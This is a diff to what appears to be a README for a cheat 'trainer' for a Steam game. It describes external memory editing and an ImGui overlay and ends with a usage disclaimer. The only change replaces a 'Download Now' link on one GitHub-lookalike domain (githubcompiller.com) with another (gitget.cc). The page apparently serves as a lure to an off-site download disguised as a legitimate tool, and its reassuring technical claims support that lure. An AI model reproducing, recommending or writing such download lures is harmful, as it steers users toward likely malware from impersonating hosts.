@@ -8,7 +8,7 @@ This v1.2 build is verified compatible with the Steam client following the Febru
 
 Our approach is purely external: we use process memory read/write via signature scanning and pointer resolution, with no DLL injection, file alterations, engine hooks, or background services. The Dear ImGui overlay operates with a minimal footprint (<10 MB RAM, <1% CPU when minimized), displaying controls seamlessly over the 2D top-down interface without affecting simulation performance or visuals.
 
-<a href="https://strd.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+<a href="https://strd.gitget.cc/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
 
 **Strict Usage Policy**  
 This trainer is strictly for offline/single-player saves and personal testing purposes only. It is not intended, tested, or supported for any potential future multiplayer modes, shared saves, leaderboards, or community events. Applying it in non-private contexts risks save instability, detection by integrity checks, or other issues. We disclaim all responsibility for misuse outside solo environments.
